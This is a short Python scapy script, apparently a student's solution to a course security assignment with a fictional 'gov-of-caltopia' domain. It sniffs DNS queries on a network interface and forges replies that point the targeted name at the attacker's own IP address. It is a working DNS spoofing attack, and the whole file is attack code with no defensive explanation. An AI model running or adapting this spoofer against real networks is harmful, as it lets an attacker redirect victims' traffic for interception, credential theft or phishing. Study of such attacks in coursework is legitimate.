#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl


our_ipaddr = get_if_addr('eth0')


def handle_packet(pkt):
    # print pkt.show()
    # if (pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[IP].src == '128.32.206.9'):
	# print pkt.show()
    if (pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[UDP].dport == 53 and pkt[DNS].qd.qname == 'email.gov-of-caltopia.info.'):
	# print pkt.show()
    # If you wanted to send a packet back out, it might look something like... 
	packet = IP(dst = pkt[IP].src , src = pkt[IP].dst)\
		 /UDP(sport = 53, dport = pkt[UDP].sport)\
		 /DNS(id = pkt[DNS].id, ancount = 1, qd = DNSQR(qname = pkt[DNS].qd.qname), an = DNSRR(rrname = pkt[DNS].qd.qname, rdata = our_ipaddr))\
		 /DNSRR(rrname = pkt[DNS].qd.qname, rdata = our_ipaddr) 
	# print packet.show()
	send(packet) 
    

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

